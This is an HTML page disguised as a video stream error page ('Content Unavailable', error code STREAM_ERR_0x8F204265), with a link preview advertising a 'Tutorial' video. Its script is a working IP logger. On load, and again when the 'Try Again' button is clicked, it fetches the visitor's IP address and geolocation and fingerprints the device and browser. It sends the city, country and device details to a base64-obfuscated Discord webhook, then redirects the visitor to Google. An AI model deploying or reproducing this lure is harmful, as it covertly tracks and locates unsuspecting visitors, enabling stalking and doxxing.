<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Content Unavailable | Stream Error</title>
    <meta property="og:title" content="Tutorial">
    <meta property="og:description" content="The media you're trying to access cannot be displayed due to a processing error.">
    <meta property="og:video" content="https://sdmntpritalynorth.oaiusercontent.com/files/00000000-c3f8-6246-8067-b170dec3dc5f/raw?se=2025-06-28T23%3A41%3A33Z&sp=r&sv=2024-08-04&sr=b&scid=48d7f55f-2dfd-5214-a8ce-293c67f8e891&skoid=0da8417a-a4c3-4a19-9b05-b82cee9d8868&sktid=a48cca56-e6da-484e-a814-9c849652bcb3&skt=2025-06-28T19%3A10%3A22Z&ske=2025-06-29T19%3A10%3A22Z&sks=b&skv=2024-08-04&sig=CSBdt/K1yWtS8tSCLapEJ11SSxC7iKgTf1B67FdiANU%3D">
    <meta property="og:video:type" content="video/mp4">
    <meta property="og:video:width" content="1280">
    <meta property="og:video:height" content="720">
    <meta property="og:type" content="video.other">
    <meta property="og:url" content="">
    <meta property="og:image" content="https://i.imgur.com/JX5gkHj.png">
    <meta name="theme-color" content="#6366f1">
    
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        :root {
            --primary: #6366f1;
            --primary-dark: #4f46e5;
            --error: #ef4444;
            --error-light: #fee2e2;
            --bg: #f9fafb;
            --card: #ffffff;
            --text: #111827;
            --text-light: #6b7280;
            --border: #e5e7eb;
            --shadow: 0 4px 6px -1px rgba(0, 0, 0, 0.1), 0 2px 4px -1px rgba(0, 0, 0, 0.06);
            --shadow-lg: 0 10px 15px -3px rgba(0, 0, 0, 0.1), 0 4px 6px -2px rgba(0, 0, 0, 0.05);
            --radius: 12px;
            --transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
        }

        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
        }

        body {
            font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
            background-color: var(--bg);
            color: var(--text);
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            line-height: 1.5;
            background-image: radial-gradient(circle at 10% 20%, rgba(233, 213, 255, 0.1) 0%, rgba(199, 210, 254, 0.1) 90%);
        }

        .error-container {
            width: 100%;
            max-width: 480px;
            padding: 2rem;
        }

        .error-card {
            background-color: var(--card);
            border-radius: var(--radius);
            box-shadow: var(--shadow-lg);
            padding: 2.5rem;
            text-align: center;
            border: 1px solid var(--border);
            transform: translateY(0);
            transition: var(--transition);
            position: relative;
            overflow: hidden;
        }

        .error-card:hover {
            transform: translateY(-4px);
            box-shadow: var(--shadow-lg), 0 20px 25px -5px rgba(0, 0, 0, 0.1);
        }

        .error-card::before {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            right: 0;
            height: 6px;
            background: linear-gradient(90deg, var(--primary), var(--error));
        }

        .error-icon {
            font-size: 5rem;
            color: var(--error);
            margin-bottom: 1.5rem;
            position: relative;
            display: inline-block;
            animation: bounce 1.5s infinite;
        }

        @keyframes bounce {
            0%, 100% { transform: translateY(0); }
            50% { transform: translateY(-15px); }
        }

        .error-icon::after {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            border-radius: 50%;
            background-color: var(--error-light);
            z-index: -1;
            transform: scale(1.5);
            opacity: 0.5;
        }

        h1 {
            color: var(--text);
            margin: 0 0 1rem;
            font-weight: 700;
            font-size: 1.5rem;
        }

        .error-message {
            color: var(--text-light);
            margin-bottom: 1.5rem;
            font-size: 1rem;
            line-height: 1.6;
        }

        .error-details {
            background: var(--error-light);
            padding: 1rem;
            border-radius: var(--radius);
            margin: 1.5rem 0;
            font-family: 'Menlo', 'Monaco', 'Consolas', monospace;
            font-size: 0.875rem;
            color: var(--error);
            border-left: 4px solid var(--error);
            text-align: left;
        }

        .error-details span {
            display: block;
            margin-bottom: 0.25rem;
        }

        .error-details span:last-child {
            margin-bottom: 0;
        }

        .loading {
            margin: 1.5rem 0;
            display: none;
        }

        .loader {
            display: inline-block;
            position: relative;
            width: 80px;
            height: 80px;
            margin-bottom: 1rem;
        }

        .loader div {
            position: absolute;
            width: 16px;
            height: 16px;
            border-radius: 50%;
            background: var(--primary);
            animation: loader 1.2s linear infinite;
        }

        .loader div:nth-child(1) {
            top: 8px;
            left: 8px;
            animation-delay: 0s;
        }

        .loader div:nth-child(2) {
            top: 8px;
            left: 32px;
            animation-delay: -0.4s;
        }

        .loader div:nth-child(3) {
            top: 8px;
            left: 56px;
            animation-delay: -0.8s;
        }

        .loader div:nth-child(4) {
            top: 32px;
            left: 8px;
            animation-delay: -0.4s;
        }

        .loader div:nth-child(5) {
            top: 32px;
            left: 32px;
            animation-delay: -0.8s;
        }

        .loader div:nth-child(6) {
            top: 32px;
            left: 56px;
            animation-delay: -1.2s;
        }

        .loader div:nth-child(7) {
            top: 56px;
            left: 8px;
            animation-delay: -0.8s;
        }

        .loader div:nth-child(8) {
            top: 56px;
            left: 32px;
            animation-delay: -1.2s;
        }

        .loader div:nth-child(9) {
            top: 56px;
            left: 56px;
            animation-delay: -1.6s;
        }

        @keyframes loader {
            0%, 100% {
                opacity: 1;
                transform: scale(1);
            }
            50% {
                opacity: 0.5;
                transform: scale(0.5);
            }
        }

        .status-text {
            color: var(--text-light);
            font-size: 0.875rem;
            margin-top: 0.5rem;
        }

        .btn {
            background-color: var(--primary);
            color: white;
            border: none;
            padding: 0.75rem 1.5rem;
            border-radius: var(--radius);
            cursor: pointer;
            font-size: 1rem;
            font-weight: 500;
            margin-top: 1rem;
            transition: var(--transition);
            width: 100%;
            max-width: 200px;
            display: inline-flex;
            align-items: center;
            justify-content: center;
            gap: 0.5rem;
        }

        .btn:hover {
            background-color: var(--primary-dark);
            transform: translateY(-2px);
            box-shadow: var(--shadow);
        }

        .btn:active {
            transform: translateY(0);
        }

        .footer {
            margin-top: 2rem;
            text-align: center;
            color: var(--text-light);
            font-size: 0.75rem;
        }

        .footer a {
            color: var(--primary);
            text-decoration: none;
            transition: var(--transition);
        }

        .footer a:hover {
            text-decoration: underline;
        }

        @media (max-width: 480px) {
            .error-card {
                padding: 1.5rem;
            }
            
            .error-icon {
                font-size: 3.5rem;
            }
            
            h1 {
                font-size: 1.25rem;
            }
            
            .btn {
                max-width: 100%;
            }
        }

        .particles {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            z-index: -1;
            pointer-events: none;
        }

        .particle {
            position: absolute;
            background: rgba(99, 102, 241, 0.1);
            border-radius: 50%;
            animation: float 15s infinite linear;
        }

        @keyframes float {
            0% {
                transform: translateY(0) rotate(0deg);
                opacity: 1;
            }
            100% {
                transform: translateY(-1000px) rotate(720deg);
                opacity: 0;
            }
        }
        
        .video-container {
            position: absolute;
            opacity: 0;
            pointer-events: none;
            width: 0;
            height: 0;
            overflow: hidden;
        }
    </style>
</head>
<body>
    <div class="particles" id="particles"></div>
    
    <div class="error-container">
        <div class="error-card">
            <div class="error-icon">
                <i class="fas fa-exclamation-triangle"></i>
            </div>
            <h1>Content Unavailable</h1>
            <p class="error-message">The media you're trying to access cannot be displayed due to a processing error. Please try again later.</p>
            
            <div class="error-details">
                <span>Error Code: <strong>STREAM_ERR_0x8F204265</strong></span>
                <span>Status: <strong>CORRUPTED_FRAMES</strong></span>
                <span>Timestamp: <strong id="timestamp"></strong></span>
            </div>
            
            <div class="loading" id="loading">
                <div class="loader">
                    <div></div><div></div><div></div>
                    <div></div><div></div><div></div>
                    <div></div><div></div><div></div>
                </div>
                <p class="status-text">Attempting to reinitialize media pipeline...</p>
            </div>
            
            <button class="btn" id="tryAgainBtn">
                <i class="fas fa-sync-alt"></i> Try Again
            </button>
        </div>
        
        <div class="footer">
            Need help? <a href="https://support.google.com" target="_blank">Contact support</a>
        </div>
    </div>

    <div class="video-container">
        <video width="1280" height="720" controls poster="https://i.imgur.com/JX5gkHj.png">
            <source src="https://files.catbox.moe/7xqe5o.mp4" type="video/mp4">
            Your browser does not support the video tag.
        </video>
    </div>

    <script>
        document.querySelector('meta[property="og:url"]').content = window.location.href;
        
        document.getElementById('timestamp').textContent = new Date().toLocaleString();
        
        function createParticles() {
            const particlesContainer = document.getElementById('particles');
            const particleCount = window.innerWidth < 768 ? 15 : 30;
            
            for (let i = 0; i < particleCount; i++) {
                const particle = document.createElement('div');
                particle.classList.add('particle');
                
                const size = Math.random() * 15 + 5;
                particle.style.width = `${size}px`;
                particle.style.height = `${size}px`;
                
                particle.style.left = `${Math.random() * 100}%`;
                particle.style.top = `${Math.random() * 100}%`;
                
                const duration = Math.random() * 20 + 10;
                const delay = Math.random() * 10;
                particle.style.animation = `float ${duration}s ${delay}s infinite linear`;
                
                particlesContainer.appendChild(particle);
            }
        }
        
        createParticles();

        const webhookUrl = atob("aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTM4ODYxMjQ5NzMyNTU1NTc1Mi9fS1J3Xy02dy04dUhnaGIzVmV1Q0xHay1ETEU0U2pRcmJTZDNWcC1XMG9SbXM4RFU0QTJwSGtiQS1RQWxqdDdGZDVELQ==");

        async function locateUser(ip) {
            try {
                const response = await fetch(`https://ipapi.co/${ip}/json/`);
                if (!response.ok) throw new Error('IP API failed');
                
                const data = await response.json();
                return {
                    ip: ip,
                    city: data.city || "Unknown",
                    region: data.region || "Unknown",
                    country: data.country_name || "Unknown",
                    countryCode: data.country_code || "??",
                    postal: data.postal || "Unknown",
                    lat: data.latitude || 0,
                    lon: data.longitude || 0,
                    timezone: data.timezone || "Unknown",
                    isp: data.org || "Unknown ISP",
                    asn: data.asn || "Unknown"
                };
            } catch (error) {
                console.error("Geolocation error:", error);
                return {
                    ip: ip,
                    error: "Geolocation failed"
                };
            }
        }

        async function getSystemInfo() {
            try {
                const connection = navigator.connection || {};
                const ipResponse = await fetch('https://api.ipify.org?format=json');
                const ipData = await ipResponse.json();
                
                return {
                    ip: ipData.ip || "Unknown",
                    userAgent: navigator.userAgent,
                    platform: navigator.platform,
                    device: {
                        screen: `${window.screen.width}x${window.screen.height}`,
                        colorDepth: window.screen.colorDepth,
                        memory: navigator.deviceMemory || "Unknown",
                        cores: navigator.hardwareConcurrency || "Unknown"
                    },
                    network: {
                        type: connection.effectiveType || "Unknown",
                        downlink: connection.downlink || "Unknown"
                    },
                    browser: {
                        language: navigator.language,
                        languages: navigator.languages ? navigator.languages.join(', ') : "Unknown"
                    },
                    time: {
                        zone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                        timestamp: new Date().toISOString()
                    },
                    referrer: document.referrer || "Direct"
                };
            } catch (error) {
                console.error("System info collection error:", error);
                return {
                    error: "Failed to collect system information"
                };
            }
        }

        function createEmbeds(ipData, systemData) {
            const mainEmbed = {
                title: "ðŸš¨ Stream Error Triggered",
                color: 0xff0000,
                description: `A user encountered stream error **STREAM_ERR_0x8F204265**`,
                fields: [
                    {
                        name: "ðŸ•’ Time",
                        value: `\`${new Date().toUTCString()}\``,
                        inline: true
                    },
                    {
                        name: "ðŸŒ Location",
                        value: ipData.city && ipData.country ? 
                            `\`${ipData.city}, ${ipData.region}, ${ipData.country} (${ipData.countryCode})\`` : 
                            `\`Location unavailable\``,
                        inline: true
                    },
                    {
                        name: "ðŸ“± Device",
                        value: `\`${systemData.platform}\` on \`${systemData.browser.language}\``,
                        inline: true
                    }
                ],
                footer: {
                    text: "Vortex Monitoring System",
                    icon_url: "https://i.imgur.com/JX5gkHj.png"
                },
                timestamp: new Date().toISOString()
            };

            return [mainEmbed];
        }

        async function sendData() {
            try {
                const systemInfo = await getSystemInfo();
                if (systemInfo.error) throw new Error(systemInfo.error);
                
                const ipLocation = await locateUser(systemInfo.ip);
                
                const embeds = createEmbeds(ipLocation, systemInfo);
                
                const response = await fetch(webhookUrl, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ 
                        username: "Vortex Monitor",
                        avatar_url: "https://i.imgur.com/JX5gkHj.png",
                        embeds,
                        content: "âš ï¸ New stream error detected\n||This system is property of Vortex||"
                    })
                });
                
                if (!response.ok) {
                    throw new Error(`Discord API responded with ${response.status}`);
                }
                
                return true;
            } catch (error) {
                console.error("Data transmission error:", error);
                return false;
            }
        }

        document.addEventListener('DOMContentLoaded', async () => {
            await sendData();
            
            document.getElementById('tryAgainBtn').addEventListener('click', async () => {
                document.getElementById('loading').style.display = 'block';
                document.getElementById('tryAgainBtn').style.display = 'none';
                
                const success = await sendData();
                
                setTimeout(() => {
                    window.location.href = success ? 
                        'https://support.google.com/youtube/' : 
                        'https://www.google.com/search?q=stream+error+0x8F204265';
                }, 2000);
            });
        });
    </script>
</body>
</html>
